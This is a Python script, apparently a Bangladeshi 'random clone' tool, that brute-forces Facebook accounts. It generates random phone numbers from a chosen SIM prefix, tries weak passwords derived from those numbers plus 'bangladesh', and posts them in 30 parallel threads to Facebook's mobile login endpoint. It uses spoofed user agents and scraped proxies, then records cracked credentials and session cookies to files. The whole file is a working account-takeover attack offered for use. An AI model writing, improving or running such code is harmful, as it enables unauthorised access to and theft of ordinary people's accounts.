import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
ok = []
cp = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
#-_-_-_--_-_-_-_-_6_-_6_-_-_6_6_6
#-$6$-_-$-$-$76$6$6$-$-$
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
logo = ("""\033[1;37m
 \033[38;5;196m  ██████   █████  ██   ██ ██ ██████  
\x1b[38;5;46m   ██   ██ ██   ██ ██  ██  ██ ██   ██ 
\033[38;5;196m   ██████  ███████ █████   ██ ██████  
\x1b[38;5;46m   ██   ██ ██   ██ ██  ██  ██ ██   ██ 
\033[38;5;196m   ██   ██ ██   ██ ██   ██ ██ ██████  
\033[38;5;46m────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m ADMIN    : MD RAKIB KING 
\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m GITHUB   : XXXX
\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m TOOL     : RANDOM CLONE
\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m VERSION  : TEST
\033[38;5;46m────────────────────────────────────────\033[1;37m""")
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;196m[\x1b[38;5;46m1\033[38;5;196m]\x1b[38;5;46m RANDOM CLONE")
        print("\033[38;5;196m[\x1b[38;5;46m2\033[38;5;196m]\x1b[38;5;46m CONTACT ADMIN ")
        print("\033[38;5;196m[\x1b[38;5;46m0\033[38;5;196m]\x1b[38;5;46m EXIT TOOL")
        print("\033[38;5;46m────────────────────────────────────────")
        niloy =input("\033[38;5;196m[\x1b[38;5;46m?\033[38;5;196m]\x1b[38;5;46m CHOICE : ")
        if niloy in ["1", "01"]:
            v1()
        if niloy in ["2","02"]:
            os.system('am start https://www.facebook.com/Toxic.boy.1433');time.sleep(5);Main()
        if niloy in [" 0", "00"]:
            exit()
        else:
            exit()
            
def v1():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m SIM CODE EXAMPLE : \x1b[38;5;46m017\033[1;96m/\x1b[38;5;46m019\033[1;96m/\x1b[38;5;46m018\033[1;96m/\x1b[38;5;46m016\033[1;96m')
    kode = input('\033[38;5;196m[\x1b[38;5;46m?\033[38;5;196m]\x1b[38;5;46m SIM CODE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' BD Number id cloner [ONLY-OK] '
    print('\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m EXAMPLE LIMIT : \x1b[38;5;46m2000\033[1;96m/\x1b[38;5;46m5000\033[1;96m/\x1b[38;5;46m10000\033[1;96m/\x1b[38;5;46m99999\033[1;96m')
    limit = int(input('\033[38;5;196m[\x1b[38;5;46m?\033[38;5;196m]\x1b[38;5;46m LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m TOTAL ID :\033[1;92m '+tl)
        print('\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m TOTAL ID :\033[1;92m '+kode)
        print("\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m TURN \033[0;91m[\x1b[38;5;46mON\033[0;91m/\x1b[38;5;46mOFF\033[0;91m]\x1b[38;5;46m FLIGHT MODE IN EVERY \033[1;96m3\x1b[38;5;46m MIN")
        print("\033[38;5;46m────────────────────────────────────────")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print('\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m Crack process has been completed')
    print('\033[38;5;196m[\x1b[38;5;46m•\033[38;5;196m]\x1b[38;5;46m Ids saved in ok.txt,cp.txt')
    print("\033[38;5;46m────────────────────────────────────────")
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\033[38;5;196m[\x1b[38;5;46mRAKIB-XD\033[38;5;196m] \x1b[38;5;46m%s\033[38;5;196m | \x1b[38;5;46mOK\033[38;5;196m:\x1b[38;5;46m%s '%(loop,len(ok))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'x.facebook.com',
            "method": 'GET',
            "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=E6roZBCBF8pc_91ZtZabYUfB; sb=E6roZCAZjGDtotLByepT9PWp; locale=en_GB; vpd=v1%3B591x313x2.3014395236968994; dpr=2.3014395236968994; m_pixel_ratio=2.3014395236968994; wl_cbv=v2%3Bclient_version%3A2312%3Btimestamp%3A1693048794; wd=313x591; fr=0ncbzO4w29hV98fB2.AWUHtYRgHNYfMHV6wGdqhsMiD6c.Bk6KoT.UX.AAA.0.0.Bk6d_3.AWU-GvLp_y0',
    'dpr': '2',
    'referer': 'https://x.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X688B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\r\033[38;5;196m[\x1b[38;5;46mRAKIB-OK\033[38;5;196m]\x1b[38;5;46m {uid}|{ps}")
                print(f"\r\x1b[38;5;46mCOOKIES : {coki}")
                open('/sdcard/RAKIB/ok.txt', 'a').write( uid+' | '+ps+'\n')
                ok.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\r\033[38;5;196m[RAKIB-CP] {cid}|{ps}")
                open('/sdcard/RAKIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
# END #
